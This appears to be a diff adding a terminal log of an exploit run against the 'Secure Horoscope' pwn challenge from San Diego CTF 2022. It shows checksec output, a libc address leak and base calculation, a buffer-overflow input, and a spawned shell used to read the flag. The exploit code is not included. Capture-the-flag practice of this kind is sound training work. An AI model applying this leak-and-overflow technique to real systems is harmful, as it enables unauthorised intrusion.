@@ -1,0 +1,29 @@
+mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Secure_Horoscope$ python solve.py r
+[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Secure_Horoscope/secureHoroscope'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to sechoroscope.sdc.tf on port 1337: Done
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr = 0x7f902e2b2970
+libc_base = 0x7f902e232000
+[*] Switching to interactive mode
+feeling like @? That's interesting.please put in your birthday and time in the format (month/day/year/time) and we will have your very own horoscope
+
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB@
+hm, I'll have to think about what this means. I'll get back to you in 5 business days.
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 16
+-rw-r--r-- 1 nobody nogroup    32 Apr 29 20:31 flag.txt
+-rwxr-xr-x 1 nobody nogroup 11424 May  6 18:51 secureHoroscope
+$ cat flag.txt
+sdctf{Th0s3_d4rN_P15C3s_g0t_m3}
